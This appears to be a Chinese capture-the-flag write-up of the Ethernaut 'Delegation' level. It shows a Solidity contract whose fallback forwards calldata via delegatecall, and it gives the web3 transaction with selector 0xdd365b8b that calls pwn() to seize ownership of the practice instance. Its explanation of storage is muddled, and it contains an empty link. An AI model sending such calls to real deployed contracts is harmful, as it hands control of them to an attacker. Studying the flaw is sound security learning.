# Delegation
关于delegatecall
```solidity
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

### 代码分析
```solidity
function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
```
fallback函数使用了delegatecall，该调用不会修改state为Delegation的storage而不是Delegate的storage。可参照
[]()查看以太坊call的相关区别

### 攻击方法
1. 向合约地址发送一条交易，并且msg.data为bytes4(keccak256("pwn()"))，该字符串可以通过web3.sha3("pwn()")
获得，"0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"，其中methodID为前8位，即
"0xdd365b8b";所以调用web3.sendTransaction({to:"your instance address", data:"0xdd365b8b"}, function(err, hash){})